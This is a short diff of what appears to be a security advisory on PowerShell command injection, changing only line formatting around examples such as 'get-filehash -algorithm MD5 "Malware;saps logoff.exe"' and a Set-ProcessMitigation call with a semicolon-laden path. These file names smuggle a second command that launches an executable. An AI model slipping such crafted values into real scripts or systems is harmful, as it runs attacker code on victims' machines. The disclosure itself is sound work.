@@ -111,8 +111,8 @@ Create directory with semicolon, drop PE file named doom.exe in same path.  <br>
 powershell Set-ProcessMitigation -PolicyFilePath  "test;saps doom"
 
 Last but not least:
-When grabbing a file hash in PowerShell logs you out  :)
-c:\> powershell  get-filehash  -algorithm MD5 "Malware;saps logoff.exe"
+When grabbing a file hash in PowerShell logs you out  :)  <br>
+c:\>powershell  get-filehash  -algorithm MD5 "Malware;saps logoff.exe"  <br>
 
 https://www.youtube.com/watch?v=0Go6yJiRWP8
 
